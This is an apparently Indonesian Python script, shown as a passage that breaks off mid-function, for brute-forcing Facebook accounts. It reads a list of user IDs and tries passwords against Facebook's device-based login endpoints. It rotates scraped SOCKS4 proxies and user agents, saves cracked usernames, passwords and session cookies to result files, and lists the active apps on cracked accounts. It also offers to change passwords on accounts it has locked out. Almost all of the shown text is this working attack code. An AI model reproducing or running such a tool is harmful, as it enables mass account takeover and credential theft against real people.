# code by YusepXD #
#Cracking File Methode#
#Silahkan Oprek Bagian Ua#

import os
try:
    import requests
except ImportError:
    print('\n [×] Modul requests belum terinstall!...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [×] Modul Futures belum terinstall!...\n')
    os.system('pip install futures')

try:
    import bs4
except ImportError:
    print('\n [×] Modul Bs4 belum terinstall!...\n')
    os.system('pip install bs4')

import requests, os, re, bs4, sys, json, time, random, datetime, subprocess
from concurrent.futures import ThreadPoolExecutor as YayanGanteng
from datetime import datetime
from bs4 import BeautifulSoup
ct = datetime.now()
n = ct.month
bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
waktu = '%s %s %s'%(ha,op,ta)
waktu.split('/')
### WARNA RANDOM ###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
############################ RESPONSE FACEBOOK ###########################################
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,pwBaru=[],[]
Apk = []
ok = []
cp = []
id = []
user = []
loop = 0
url_lookup = "https://lookup-id.com/"
url_mb = "https://mbasic.facebook.com"
url_ip = "https://www.httpbin.org/ip"
url_graph = "https://graph.facebook.com/{}"
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 7.1.1; CPH1723 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/E7FBAF"}
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
hhhh, iiii, jjjj, kkkk = "index.php?", "next=https%3A%2F%2Fdevelopers.facebook.com", "%2Ftools%2Fdebug", "%2Faccesstoken%2F"
dddd, eeee, ffff, gggg = "login", "device-based", "validate-password", "?shbl=0"
aaaa, bbbb, cccc = "tools", "debug", "accesstoken"
bahasa = "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"

##############################
 # USER AGENT #
ugen2=['Mozilla/5.0 (Linux; Android 11; vivo 1904; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.3.3.0']
ugen=['Mozilla/5.0 (Linux; Android 7.1.1; CPH1723) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36']

try:
    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('.proxy.txt','w').write(prox)
except Exception as e:
    exit(e)


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)
     
def mentod():
    print('%s══════════════════════════════════════════\n %s Setting Methode Menu%s'%(N,BM,N))
    print(' %s[%s1%s] Method 1 free (%sRecommended%s)'%(N,H,N,H,N))
    print(' [%s2%s] Method 2 mbasic (%sRecommended%s)'%(H,N,H,N))
    print(' [%s3%s] Method 3 mobile (%sRecommended%s)'%(H,N,H,N))
#-------- LOADING ANIMASI ------------
def loading():
    animation = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(50):
        time.sleep(0.1)
        sys.stdout.write(f"\r├───{N}[{H}•{N}] {H}Loading...{N} " + animation[i % len(animation)] +"\x1b[0m ")
        sys.stdout.flush()
    print("")
# LOGO
def logo():
    os.system("clear")
    print("""
 \x1b[1;97m ╭────── \x1b[1;93m─━\x1b[1;96m㋱\x1b[1;93m•\x1b[1;92m[\x1b[1;97mMulti Brute Force Facebook\x1b[1;92m]\x1b[1;93m•\x1b[1;96m㋱\x1b[1;93m━─ \x1b[1;97m──────╮
 \x1b[1;97m │\x1b[1;92m     _________ .__                                  \x1b[1;97m│
 \x1b[1;97m │\x1b[1;92m     \_   ___ \|  |__ _____    ____    ____         \x1b[1;97m│
 \x1b[1;97m │\x1b[1;92m     /    \  \/|  |  \\__   \  /    \  / ___\        \x1b[1;97m│
 \x1b[1;97m │\x1b[1;92m     \     \___|   Y  \/ __ \|   |  \/ /_/  >       \x1b[1;97m│
 \x1b[1;97m │\x1b[1;92m      \______  /___|  (____  /___|  /\___  /        \x1b[1;97m│
 \x1b[1;97m │\x1b[1;92m             \/     \/     \/     \//_____/         \x1b[1;97m│
 \x1b[1;97m │ Whatsapp  : 0819-0776-1235         \x1b[1;90mVersion\x1b[1;97m :  \x1b[1;90m1\x1b[1;97m.\x1b[1;90m10\x1b[1;97m │\n \x1b[1;97m ╰─────────────────────────━\x1b[1;93m㋱\x1b[0m[\033[41m\033[1;37m Author : ChangFB \x1b[0m]\x1b[1;93m㋱\x1b[0m━─╯\n""")
#CRACK SELESAI
def hasil(ok,cp):
    if len(ok) != 0 or len(cp) != 0:
        print(f'\n%s══════════════════════════════════════════\n [%s✓%s] %sCracking By James Usercrack...\n%s══════════════════════════════════════════'%(N,H,N,H,N))
        print(f' %s[%s+%s] Number of Accounts OK : %s%s%s'%(H,H,H,H,str(len(ok)),H))
        print(f' [%s+%s] Number of Accounts CP : %s%s%s'%(H,H,H,str(len(cp)),H))
        cek_cp = input(f"{H}══════════════════════════════════════════\n [{H}+{H}] Show CP detector options [{H}Y{N}/{M}t{N}]: ")
        if cek_cp =="":
            print(f"\n [{M}!{N}] Don't be empty");hasil(ok,cp)
        elif cek_cp in["Y","y"]:
            jalan(f" {N}[{M}!{N}] Play airplanemode first");time.sleep(5)
            ww=input(f"\n {N}[{K}?{N}] Change password when {BM}TAP YES{N} [{H}Y{N}/{M}t{N}]: ")
            if ww in ("Y","y","ya"):
                ubahP.append("y")
                print(f" {N}[{H}•{N}] Password example : {H}james123{N}")
                pwBar=input(f" {N}[{K}?{N}] Enter new password : {H}")
                #print("\n")
                if len(pwBar) <= 5:
                    print('\n %s[%s×%s] Password minimum 6 characters'%(N,M,N))
                else:
                    pwBaru.append(pwBar)
            for memek in cp:
                kontol = memek.replace('\n', '')
                titid  = kontol.split(' • ')
                print(f'{N}══════════════════════════════════════════\n {H}LOGIN PROCESS')
                jalan(f' {N}[{M}?{N}] Account : {K}{kontol.replace("[JAMES-CP] ", "")}{N}')
                try:
                    log_hasil(titid[0].replace("[JAMES-CP] ", ""), titid[1])
                except requests.exceptions.ConnectionError:
                    continue
                    print("")
            print("")
            jalan(' %s[%s✓%s] %sChecking process is complete%s'%(N,H,N,H,N))
            jalan(' %s[%s✓%s] Retrun SC type "%spython UserCrack.py%s"'%(N,H,N,H,N));exit()
        elif cek_cp in["T","t"]:
            jalan(f"\n {N}[{H}•{N}] {N}Ok, thank you. Retrun SC type '{H}python UserCrack.py{N}'");exit()
        else:
            print(f"\n {N}[{M}!{N}] Choose Y/t");hasil(ok,cp)
    else:
        jalan('\n\n %s[%s!%s] Sorry you didnt get results'%(N,M,N));exit()


def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r %s[%s!%s] %sSorry there is no Active Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r 🎮  %sYour Active Application Details :'%(H))
        for i in range(len(game)):
            print(f"\r %s%s. %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r %s[%s!%s] %sSorry no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r 🎮  %sYour Expired Application Details :'%(M))
        for i in range(len(game)):
            print(f"\r %s%s. %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print(f'\r')
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie\n'%(N,M,N))
#METODE LOGIN
### MENU UTAMA ###
def file():
            os.system("clear")
            logo()
            print('\x1b[1;97m|————————————\x1b[1;96m>\x1b[1;95m>\x1b[1;94m>\x1b[1;93m <> \x1b[1;91m[ \x1b[1;92mThe Changcuters \x1b[1;91m]\x1b[1;93m <> \x1b[1;96m>\x1b[1;95m>\x1b[1;94m>\x1b[1;97m\n|\x1b[1;97m ╭────────────────────────────────────────────────────╮\n|\x1b[1;97m │\x1b[1;93m   _________                                  .__   \x1b[1;97m│\n|\x1b[1;97m │\x1b[1;93m  /   _____/__.__._____    _____   ________ __|  |  \x1b[1;97m│\n|\x1b[1;97m │\x1b[1;93m  \_____  <   |  |\__  \  /     \ /  ___/  |  \  |  \x1b[1;97m│\n|\x1b[1;97m │\x1b[1;93m  /        \___  | / __ \|  Y Y  \\___ \|  |  /  |__ \x1b[1;97m│\n|\x1b[1;97m │\x1b[1;93m /_______  / ____|(____  /__|_|  /____  >____/|____/\x1b[1;97m│\n|\x1b[1;97m │\x1b[1;93m         \/\/          \/      \/     \/   \x1b[1;90mV \x1b[1;97m: \x1b[1;90m1\x1b[1;97m.\x1b[1;90m10 \x1b[1;97m│\n|\x1b[1;97m ╰\x1b[0m[\033[41m\033[1;37m Author : ChangFB \x1b[0m]────────────────────────────────╯')
            print("\x1b[1;97m|──────────────────────────────────────────────────────\n\x1b[1;97m|——\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] Github : ChangFB\x1b[1;97m     [\x1b[1;92m+\x1b[1;97m] Status : \x1b[1;92mPremium\n\x1b[1;97m|——[\x1b[1;92m+\x1b[1;97m] Author : Changcuters [\x1b[1;92m+\x1b[1;97m] WA     : 0819-0776-1235")
            key = input("\x1b[1;97m|──────────────────────────────────────────────────────\n\x1b[1;97m|──────────────────────────────────────────────────────\n\x1b[1;97m|——[\x1b[1;92m1\x1b[1;97m] Crack File [\x1b[1;92mFACEBOOK\x1b[1;97m]\x1b[1;92m✓\n\x1b[1;97m|─╭[Menu]──────────────────────────────────────────────\n| ╰─➣\x1b[1;92m\x1b[1;97m ")
            if key in [""]:
                print("\x1b[1;97m|————————————\x1b[1;96m>\x1b[1;95m>\x1b[1;94m>\x1b[1;93m <> \x1b[1;91m[ \x1b[1;92mThe Changcuters \x1b[1;91m]\x1b[1;93m <> \x1b[1;96m>\x1b[1;95m>\x1b[1;94m>\x1b[1;97m\n\x1b[1;97m|\x1b[1;97m ╭────── \x1b[1;93m─━\x1b[1;96m㋱\x1b[1;93m•\x1b[1;92m[\x1b[1;97mMulti Brute Force Facebook\x1b[1;92m]\x1b[1;93m•\x1b[1;96m㋱\x1b[1;93m━─ \x1b[1;97m──────╮\n|\x1b[1;97m │\x1b[1;96m     _________ .__                                  \x1b[1;97m│\n|\x1b[1;97m │\x1b[1;96m     \_   ___ \|  |__ _____    ____    ____         \x1b[1;97m│\n|\x1b[1;97m │\x1b[1;96m     /    \  \/|  |  \\__   \  /    \  / ___\        \x1b[1;97m│\n|\x1b[1;97m │\x1b[1;96m     \     \___|   Y  \/ __ \|   |  \/ /_/  >       \x1b[1;97m│\n|\x1b[1;97m │\x1b[1;96m      \______  /___|  (____  /___|  /\___  /        \x1b[1;97m│\n|\x1b[1;97m │\x1b[1;96m             \/     \/     \/     \//_____/         \x1b[1;97m│\n|\x1b[1;97m │ Whatsapp  : 0822-6131-0817         \x1b[1;90mVersion\x1b[1;97m :  \x1b[1;90m1\x1b[1;97m.\x1b[1;90m10\x1b[1;97m │\n|\x1b[1;97m ╰─────────────────────────━\x1b[1;93m㋱\x1b[0m[\033[41m\033[1;37m Author : ChangFB \x1b[0m]\x1b[1;93m㋱\x1b[0m━─╯\n\x1b[1;97m|───────────────────────────────────────────────────────\n\x1b[1;97m|——[\x1b[1;92m+\x1b[1;97m] Silakan Pilih Opsi yang Benar")
                exit()
            elif key in ["1", "01"]:
                __chigoue__().chi(id)
            elif key in ["Hasil","02"]:
                result()

# MULAI CRACK
class __chigoue__:
    def __init__(self):
        self.id = []
    def chi(self, id):
        os.system("clear")
        logo()
        crot = input(f"\x1b[1;97m|————————————\x1b[1;96m>\x1b[1;95m>\x1b[1;94m>\x1b[1;93m <> \x1b[1;91m[ \x1b[1;92mThe Changcuters \x1b[1;91m]\x1b[1;93m <> \x1b[1;96m>\x1b[1;95m>\x1b[1;94m>\x1b[1;97m\n\x1b[1;97m|\x1b[1;97m ╭────── \x1b[1;93m─━\x1b[1;96m㋱\x1b[1;93m•\x1b[1;92m[\x1b[1;95mMulti Brute Force Facebook\x1b[1;92m]\x1b[1;93m•\x1b[1;96m㋱\x1b[1;93m━─ \x1b[1;97m──────╮\n|\x1b[1;97m │\x1b[1;96m     _________ .__                                  \x1b[1;97m│\n|\x1b[1;97m │\x1b[1;96m     \_   ___ \|  |__ _____    ____    ____         \x1b[1;97m│\n|\x1b[1;97m │\x1b[1;96m     /    \  \/|  |  \\__   \  /    \  / ___\        \x1b[1;97m│\n|\x1b[1;97m │\x1b[1;96m     \     \___|   Y  \/ __ \|   |  \/ /_/  >       \x1b[1;97m│\n|\x1b[1;97m │\x1b[1;96m      \______  /___|  (____  /___|  /\___  /        \x1b[1;97m│\n|\x1b[1;97m │\x1b[1;96m             \/     \/     \/     \//_____/         \x1b[1;97m│\n|\x1b[1;97m │ Whatsapp  : 0822-6131-0817         \x1b[1;90mVersion\x1b[1;97m :  \x1b[1;90m1\x1b[1;97m.\x1b[1;90m10\x1b[1;97m │\n|\x1b[1;97m ╰─────────────────────────━\x1b[1;93m㋱\x1b[0m[\033[41m\033[1;37m Author : ChangFB \x1b[0m]\x1b[1;93m㋱\x1b[0m━─╯\n\x1b[1;97m|───────────────────────────────────────────────────────\n\x1b[1;97m|——[\x1b[1;92m+\x1b[1;97m] Ingin Menampilkan Aplikasi Terkait [\x1b[1;92mY\x1b[1;97m/\x1b[1;92mT\x1b[1;97m] :\x1b[1;92m ")
        if crot in[""]:
            print(f"\x1b[1;97m|\x1b[1;97m ╭────── \x1b[1;93m─━\x1b[1;96m㋱\x1b[1;93m•\x1b[1;92m[\x1b[1;97mMulti Brute Force Facebook\x1b[1;92m]\x1b[1;93m•\x1b[1;96m㋱\x1b[1;93m━─ \x1b[1;97m──────╮\n|\x1b[1;97m │\x1b[1;96m     _________ .__                                  \x1b[1;97m│\n|\x1b[1;97m │\x1b[1;96m     \_   ___ \|  |__ _____    ____    ____         \x1b[1;97m│\n|\x1b[1;97m │\x1b[1;96m     /    \  \/|  |  \\__   \  /    \  / ___\        \x1b[1;97m│\n|\x1b[1;97m │\x1b[1;96m     \     \___|   Y  \/ __ \|   |  \/ /_/  >       \x1b[1;97m│\n|\x1b[1;97m │\x1b[1;96m      \______  /___|  (____  /___|  /\___  /        \x1b[1;97m│\n|\x1b[1;97m │\x1b[1;96m             \/     \/     \/     \//_____/         \x1b[1;97m│\n|\x1b[1;97m │ Whatsapp  : 0822-6131-0817         \x1b[1;90mVersion\x1b[1;97m :  \x1b[1;90m1\x1b[1;97m.\x1b[1;90m10\x1b[1;97m │\n|\x1b[1;97m ╰─────────────────────────━\x1b[1;93m㋱\x1b[0m[\033[41m\033[1;37m Author : ChangFB \x1b[0m]\x1b[1;93m㋱\x1b[0m━─╯\n\x1b[1;97m|───────────────────────────────────────────────────────\n\x1b[1;97m|——[\x1b[1;92m3\x1b[1;97m] Jangan Kosong");__chigoue__().chi(id)
        elif crot in["Y","y"]:
            Apk.append("y")
        elif crot in["T","t"]:
            Apk.append("t")
        else:
            #jalan(f" {N}[{M}×{N}] Sorry, wrong username");self.tampilkan_apk()
            print(f" {H}[{H}×{H}] Select Between y/t");__chigoue__().chi(id)
        self.cnt = input('\x1b[1;97m|\x1b[1;97m ╭────── \x1b[1;93m─━\x1b[1;96m㋱\x1b[1;93m•\x1b[1;92m[\x1b[38;5;208mMulti Brute Force Facebook\x1b[1;92m]\x1b[1;93m•\x1b[1;96m㋱\x1b[1;93m━─ \x1b[1;97m──────╮\n|\x1b[1;97m │\x1b[1;93m     _________ .__                                  \x1b[1;97m│\n|\x1b[1;97m │\x1b[1;93m     \_   ___ \|  |__ _____    ____    ____         \x1b[1;97m│\n|\x1b[1;97m │\x1b[1;93m     /    \  \/|  |  \\__   \  /    \  / ___\        \x1b[1;97m│\n|\x1b[1;97m │\x1b[1;93m     \     \___|   Y  \/ __ \|   |  \/ /_/  >       \x1b[1;97m│\n|\x1b[1;97m │\x1b[1;93m      \______  /___|  (____  /___|  /\___  /        \x1b[1;97m│\n|\x1b[1;97m │\x1b[1;93m             \/     \/     \/     \//_____/         \x1b[1;97m│\n|\x1b[1;97m │ Whatsapp  : 0822-6131-0817         \x1b[1;90mVersion\x1b[1;97m :  \x1b[1;90m1\x1b[1;97m.\x1b[1;90m10\x1b[1;97m │\n|\x1b[1;97m ╰─────────────────────────━\x1b[1;93m㋱\x1b[0m[\033[41m\033[1;37m Author : ChangFB \x1b[0m]\x1b[1;93m㋱\x1b[0m━─╯\n\x1b[1;97m|───────────────────────────────────────────────────────\n\x1b[1;97m|——[\x1b[1;92m+\x1b[1;97m] Enter File Name :\033[1;92m ')
        self.id = open(self.cnt).read().splitlines()
        os.system('clear')
        ___two___ = ('y')
        if ___two___ in ('yes', 'Yes', 'Y', 'y'):
#            self.__ok__()
            self.__pler__()
        else:
            print(' [!] Choose Correct One')
            self.chi(id)

# PROSES CRACK METODE 3 in 1
    def __metode__(self, cebok, user, pasw):
        global ok,cp,loop
        animasi = random.choice(["\x1b[1;90m[\x1b[1;96mChangFB\x1b[1;90m]","\x1b[1;90m[\x1b[1;96mChangFB\x1b[1;90m]","\x1b[1;90m[\x1b[1;96mChangFB\x1b[1;90m]","\x1b[1;90m[\x1b[1;96mChangFB\x1b[1;90m]","\x1b[1;90m[\x1b[1;96mChangFB\x1b[1;90m]","\x1b[1;90m[\x1b[1;96mChangFB\x1b[1;90m]","\x1b[1;90m[\x1b[1;96mChangFB\x1b[1;90m]"])
        sys.stdout.write(f"\r {N}{animasi} {N}{loop}{N}/{M}{len(self.id)} {N}[{H}OK:{len(ok)}{N}][{K}CP:{len(cp)}{N}] [{H}{'{:.1%}'.format(loop/float(len(self.id)))}{N}]")
        sys.stdout.flush()   
        try:os.mkdir('results')
        except:pass
        try:
            for pw in pasw:
                pw = pw.lower()
                session=requests.Session()
                nip=random.choice(prox)
                proxs= {'http': 'socks4://'+nip}
                ua = random.choice(ugen)
                'Mozilla/5.0 (Linux; Android 11; vivo 1904; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.3.3.0'
                ua2 = random.choice(ugen2)
                session.headers.update({'Host': cebok,'cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                p = session.get('https://'+cebok+'/login/device-based/password/?uid='+user+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
                dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":user,"next":"https://"+cebok+"/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
                koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
                koki+=' m_pixel_ratio=2.625; wd=412x756'
                heade={'Host': cebok,'cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://'+cebok,'content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://'+cebok+'/login/device-based/password/?uid='+user+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
                po = session.post('https://'+cebok+'/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
                if "c_user" in session.cookies.get_dict():
                    cooz = session.cookies.get_dict()
                    coki = 'datr=' + cooz['datr'] + ';' + ('c_user=' + cooz['c_user']) + ';' + ('fr=' + cooz['fr']) + ';' + ('xs=' + cooz['xs'])
                    if "t" in Apk:
                        print('\r %sOK %s               \n Username : %s\n Password : %s%s'%(H,waktu,user,pw,N))
                        print(f'\r {H}Cookie   : {coki}\n')
                    elif "y" in Apk:
                        print(f'\r %sOK %s               \n Username : %s\n Password : %s%s'%(H,waktu,user,pw,N))
                        print(f'\r {H}Cookie   : {coki}')
                    wrt = '[YUSEP-OK] %s • %s' % (user,pw)
                    ok.append(wrt)
                    cek_apk(session,coki)
                    open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                    try:
                        tokenz = open('.token.txt').read()
                        cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                        month, day, year = cp_ttl.split('/')
                        month = bulan_ttl[month]
                        print('\r %sYUSEP-CP %s               \n Username : %s\n Password : %s\n Tanggal Lahir : %s %s %s%s\n'%(K,waktu,user,pw,day,month,year,N))
                        wrt = '[YUSE-CP] %s • %s • %s %s %s' % (user,pw,day,month,year)
                        cp.append(wrt)
                        open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                        break
                    except (KeyError, IOError):
                        month = ''
                        day   = ''
                        year  = ''
                    except:pass
                    print('\r %sYUSEP-CP %s               \n Username : %s\n Password : %s%s\n'%(K,waktu,user,pw,N))
                    wrt = '[YUSEP-CP] %s • %s' % (user,pw)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                else:
                    continue
                #time.sleep(31)
            loop+=1
        except requests.exceptions.ConnectionError:
             self.__metode__(cebok, user, pasw)


    def __pler__(self):
        os.system('clear')
        logo()
        print ('\x1b[1;97m|──────────────────────────────────────────────────────')
        print ('\x1b[1;97m|——[\x1b[1;92m1\x1b[1;97m] Metode [\x1b[1;92mFree\x1b[1;97m]')
        print ('\x1b[1;97m|——[\x1b[1;92m2\x1b[1;97m] Metode [\x1b[1;92mMbasic\x1b[1;97m]')
        print ('\x1b[1;97m|——[\x1b[1;92m3\x1b[1;97m] Metode [\x1b[1;92mMobile\x1b[1;97m]')
        yan = input('%s%s%s\x1b[1;97m|─╭[Metode]─────────────────────────────────────────────\n| ╰─➣\x1b[1;92m\x1b[1;97m '%(H,H,H))
        if yan == '':
            print('%s%s%s\x1b[1;97m|\x1b[1;97m ╭────── \x1b[1;93m─━\x1b[1;96m㋱\x1b[1;93m•\x1b[1;92m[\x1b[1;97mMulti Brute Force Facebook\x1b[1;92m]\x1b[1;93m•\x1b[1;96m㋱\x1b[1;93m━─ \x1b[1;97m──────╮\n|\x1b[1;97m │\x1b[1;96m     _________ .__                                  \x1b[1;97m│\n|\x1b[1;97m │\x1b[1;96m     \_   ___ \|  |__ _____    ____    ____         \x1b[1;97m│\n|\x1b[1;97m │\x1b[1;96m     /    \  \/|  |  \\__   \  /    \  / ___\        \x1b[1;97m│\n|\x1b[1;97m │\x1b[1;96m     \     \___|   Y  \/ __ \|   |  \/ /_/  >       \x1b[1;97m│\n|\x1b[1;97m │\x1b[1;96m      \______  /___|  (____  /___|  /\___  /        \x1b[1;97m│\n|\x1b[1;97m │\x1b[1;96m             \/     \/     \/     \//_____/         \x1b[1;97m│\n|\x1b[1;97m │ Whatsapp  : 0822-6131-0817         \x1b[1;90mVersion\x1b[1;97m :  \x1b[1;90m1\x1b[1;97m.\x1b[1;90m10\x1b[1;97m │\n|\x1b[1;97m ╰─────────────────────────━\x1b[1;93m㋱\x1b[0m[\033[41m\033[1;37m Author : ChangFB \x1b[0m]\x1b[1;93m㋱\x1b[0m━─╯\n\x1b[1;97m|───────────────────────────────────────────────────────\n\x1b[1;97m|——[\x1b[1;92m+\x1b[1;97m] Sorry, it is wrong...!'%(N,M,N));self.__pler__()
        elif yan in ('1', '01'):
            xx = "free.facebook.com"
            self.kombinasi_pw(xx)
        elif yan in ('2', '02'):
            xx = "mbasic.facebook.com"
            self.kombinasi_pw(xx)
        elif yan in ('3', '03'):
